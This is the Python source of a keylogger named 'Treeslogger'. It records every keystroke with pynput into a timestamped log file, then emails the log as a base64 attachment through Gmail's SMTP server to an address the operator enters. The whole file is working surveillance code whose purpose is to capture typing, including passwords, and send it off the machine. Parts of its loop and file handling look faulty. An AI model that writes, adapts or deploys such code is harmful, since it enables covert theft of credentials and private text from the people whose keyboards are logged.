#!/usr/bin/env python3
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
from pynput import keyboard
from colorama import Fore, Style

#Banner
print(Fore.RED + " ______             __")
print(Fore.RED + "(  /               ( /                  " + Fore.WHITE + "v1.0")
print(Fore.RED + "  /_   _  _  (      /    __ _,  _,  _  _")
print(Fore.RED + "_// (_(/_(/_/_)_  (/___/(_)(_)_(_)_(/_/ (_ ")
print(Fore.RED + "                            /|  /|") 
print(Fore.WHITE + "---------------------------" + Fore.RED + "(/" + Fore.WHITE + "--" + Fore.RED + "(/" + Fore.WHITE + "---------------")

#Capture the variables for File Naming and use with the UI
time = datetime.now().strftime("%d-%m-%Y_%H:%M:%S%p")
time_as_string = str(time)
timestamp = datetime.now().strftime("[%H:%M:%S %p]")
timestamp_as_string = str(timestamp)
colored_prompt = "[" + Fore.GREEN + "*" + Fore.WHITE + "]"

#Prompt for Email Information
sender_email = input(f"{colored_prompt} Please enter your gmail address:     ")
password = input(f"{colored_prompt} Please enter your gmail password:    ")
receiver_email = input(f"{colored_prompt} Please enter email to recieve logs:  ")

#Create a function to log each keypress.
#Include a series of logical operators replacing common keys with more readable formatting.
#(Default pynput output is very verbose)
def on_release(key):
	print(Fore.RED + f"{timestamp_as_string}" + Fore.WHITE + f" Keystroke Logged!: {key}")
	if key == keyboard.Key.space:
		key = " <SPACEBAR> "
	elif key == keyboard.Key.enter:
		key = " <ENTER> \n "
	elif key == keyboard.Key.backspace:
		key = " <BACKSPACE> "
	elif key == keyboard.Key.up:
		key = " <UP ARROW> "
	elif key == keyboard.Key.down:
		key = " <DOWN ARROW> "
	elif key == keyboard.Key.left:
		key = " <LEFT ARROW >"
	elif key == keyboard.Key.right:
		key = " <RIGHT ARROW> "
	elif key == keyboard.Key.caps_lock:
		key = " <CAPSLOCK> "
	elif key == keyboard.Key.ctrl:
		key = " <L_CTRL> "
	elif key == keyboard.Key.ctrl_r:
		key = " <R_CTRL> "
	elif key == keyboard.Key.menu:
		key = " <MENU> "
	elif key == keyboard.Key.home:
		key = " <HOME> "
	elif key == keyboard.Key.cmd:
		key = " <L_CMD> "
	elif key == keyboard.Key.cmd_r:
		key = " <R_CMD> "
	elif key == keyboard.Key.alt:
		key = " <L_ALT> "
	elif key == keyboard.Key.alt_r:
		key = " <R_ALT> "
	elif key == keyboard.Key.end:
		key = " <END> "
	elif key == keyboard.Key.insert:
		key = " <INSERT> "
	elif key == keyboard.Key.page_up:
		key = " <PG_UP> "
	elif key == keyboard.Key.page_down:
		key = " <PG_DOWN> "
	elif key == keyboard.Key.tab:
		key = " <TAB> "
	elif key == keyboard.Key.shift:
		key = " <L_SHIFT> "
	elif key == keyboard.Key.shift_r:
		key = " <R_SHIFT> "
	elif key == keyboard.Key.delete:
		key = " <DEL> "
	elif key == keyboard.Key.f1:
		key = " <F1> "
	elif key == keyboard.Key.f2:
		key = " <F2> "
	elif key == keyboard.Key.f3:
		key = " <F3> "
	elif key == keyboard.Key.f4:
		key = " <F4> "
	elif key == keyboard.Key.f5:
		key = " <F5> "
	elif key == keyboard.Key.f6:
		key = " <F6> "
	elif key == keyboard.Key.f7:
		key = " <F7> "
	elif key == keyboard.Key.f8:
		key = " <F8> "
	elif key == keyboard.Key.f9:
		key = " <F9> "
	elif key == keyboard.Key.f10:
		key = " <F10> "
	elif key == keyboard.Key.f11:
		key = " <F11> "
	elif key == keyboard.Key.f12:
		key = " <F12> "
	elif key == keyboard.Key.esc:
		key = " <ESC> "
	elif key == keyboard.Key.print_screen:
		key = " <PRINTSC> "
	elif key == keyboard.Key.scroll_lock:
		key = " <SCRLOCK> "
	elif key == keyboard.Key.pause:
		key = " <BREAK> "
	f.write(str(key).replace("'", ""))

#Start the listener
listener = keyboard.Listener(on_release=on_release)
listener.start()
print(f"{colored_prompt} Listener Started. Script is active.")
print(f"{colored_prompt} Beginning Keypress Livestream.")
print(f"{colored_prompt} Press Ctrl & C at any time to stop execution.")
print(Fore.RED + "-------------" + Fore.WHITE + "LOGGING-KEYSTROKES" + Fore.RED + "----------------")
#Keep the file and listener open with an infinite loop.
while True:
	try:
		i=0
		f = open("logs/" + time_as_string + ".txt", "a")
	except KeyboardInterrupt:
		print(f"\n{colored_prompt} Exiting Keylogger!")
		break

#Adding additional email variables
subject = f"Treeslogger Update {time_as_string}"
body = f"Hi. Please find attatched your keylogger report for {time_as_string}."

#create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email
#Add body to email
message.attach(MIMEText(body, "plain"))
#Open file in binary mode
with open("logs/" + time_as_string + ".txt", "rb") as attachment:
	#Add file as application/octet-stream
	#Email client can usually download this automatically as attatchment
	part = MIMEBase("application", "octet-stream")
	part.set_payload(attachment.read())

#Encode file in ASCII chars to send via email
encoders.encode_base64(part)

#Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {f}",
)

#Add attatchment to sessage and convert message to string
message.attach(part)
text = message.as_string()

#Log into server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)
#Print a confirmation message and close the file
print(f"{colored_prompt} Your logs have been sent to " + receiver_email + ".")
f.close()
